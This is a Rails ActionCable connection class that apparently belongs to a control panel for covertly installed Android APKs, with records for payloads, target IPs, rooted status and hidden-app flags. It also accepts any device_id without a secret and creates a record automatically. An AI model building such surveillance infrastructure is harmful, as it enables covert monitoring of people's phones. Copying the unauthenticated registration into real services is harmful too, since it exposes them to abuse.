module ApplicationCable
  class Connection < ActionCable::Connection::Base
    identified_by :current_user_type, :current_identifier

    def connect
      self.current_identifier, self.current_user_type = find_verified_user
      logger.info "[ActionCable] #{current_user_type} '#{current_identifier}' connected"
    rescue ActiveRecord::RecordNotFound
      reject_unauthorized_connection
    end

    private

    def find_verified_user
      # Try admin session first (browser dashboard)
      if (admin_user = find_admin_user)
        return [admin_user.email, :admin]
      end

      # Try device token auth (Android client)
      smartphone = find_verified_smartphone
      [smartphone.device_id, :device]
    end

    def find_admin_user
      if env['warden']&.user(:admin_user)
        env['warden'].user(:admin_user)
      end
    end

    def find_verified_smartphone
      device_id = request.params[:device_id] || request.headers['X-Device-ID']

      if device_id.blank?
        logger.warn "ActionCable auth: Missing device_id"
        raise ActiveRecord::RecordNotFound
      end

      # Find or auto-create smartphone
      smartphone = Smartphone.find_by(device_id: device_id)
      unless smartphone
        logger.info "ActionCable: New device #{device_id} connecting, auto-creating record..."
        smartphone = create_placeholder_device(device_id)
      end

      smartphone
    end

    def create_placeholder_device(device_id)
      retries ||= 0

      # Use transaction with advisory lock to prevent race conditions
      ActiveRecord::Base.transaction do
        # Acquire advisory lock for PostgreSQL only (SQLite uses implicit locking)
        if ActiveRecord::Base.connection.adapter_name == 'PostgreSQL'
          lock_key = Zlib.crc32(device_id)
          ActiveRecord::Base.connection.select_value(
            ActiveRecord::Base.send(:sanitize_sql_array, ["SELECT pg_advisory_xact_lock(?)", lock_key])
          )
        end

        # Check if smartphone already exists (another request might have created it)
        smartphone = Smartphone.find_by(device_id: device_id)
        return smartphone if smartphone

        # Ensure dependencies exist
        payload = ApkPayload.find_or_create_by!(name: 'default') do |apk|
          apk.destination_ip = '0.0.0.0'
          apk.destination_port = '8080'
        end

        # Check if installation exists first to handle race condition
        installation = ApkInstallation.find_by(target_ip: device_id)
        unless installation
          installation = ApkInstallation.create!(
            target_ip: device_id,
            apk_payload: payload,
            status: 'installed'
          )
        end

        # Create smartphone atomically
        smartphone = Smartphone.create!(
          device_id: device_id,
          apk_installation: installation,
          name: "Device #{device_id[0..7]}",
          operating_system: 'Android',
          is_rooted: 'Unknown',
          is_app_hidden: 'false'
        )

        smartphone
      end
    rescue ActiveRecord::RecordNotUnique, ActiveRecord::RecordInvalid => e
      # On unique constraint violation, retry with backoff
      if (retries += 1) < 3
        sleep(0.1 * retries) # Exponential backoff
        retry
      end
      logger.error "Failed to auto-create device (retry limit reached): #{e.message}"
      raise ActiveRecord::RecordNotFound
    rescue => e
      logger.error "Failed to auto-create device during connection: #{e.message}"
      raise ActiveRecord::RecordNotFound
    end
  end
end
